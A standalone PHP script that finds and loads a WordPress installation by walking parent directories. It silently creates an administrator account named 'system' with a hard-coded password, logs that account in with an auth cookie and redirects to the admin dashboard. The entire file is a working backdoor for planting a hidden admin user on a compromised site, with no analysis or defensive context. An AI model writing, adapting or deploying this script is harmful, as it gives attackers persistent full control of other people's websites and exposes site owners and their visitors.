<?php
ob_start();

function find_wp_load() {
    $dir = dirname(__FILE__);
    $max_depth = 10;
    for ($i = 0; $i < $max_depth; $i++) {
        $path = $dir . str_repeat('/..', $i) . '/wp-load.php';
        if (file_exists($path)) {
            return realpath($path);
        }
    }
    $extra = [
        $dir . '/wp/wp-load.php',
        $dir . '/wordpress/wp-load.php',
        $dir . '/blog/wp-load.php'
    ];
    foreach ($extra as $path) {
        if (file_exists($path)) {
            return realpath($path);
        }
    }
    return false;
}

$wp_load_path = find_wp_load();
if ($wp_load_path) {
    require_once($wp_load_path);
    
    // ====== USER CONFIGURATION ====== //
    $new_username = 'system';      // Set your username
    $new_password = 'SysTem9999$#@!';       // Set your password
    $new_email    = 'system@example.com'; // Set your email
    // ================================ //

    // Check if user already exists
    if (!username_exists($new_username) && !email_exists($new_email)) {
        // Create new user
        $user_id = wp_create_user($new_username, $new_password, $new_email);
        
        if (!is_wp_error($user_id)) {
            // Assign administrator role
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            
            // Auto-login the new user
            wp_set_current_user($user_id, $new_username);
            wp_set_auth_cookie($user_id);
            do_action('wp_login', $new_username, $user);
            
            // Redirect to admin dashboard
            header("Location: " . admin_url());
            exit;
        } else {
            echo "User creation failed: " . $user_id->get_error_message();
        }
    } else {
        echo "User with this username or email already exists.";
    }
} else {
    echo "WordPress not detected.";
}

ob_end_flush();
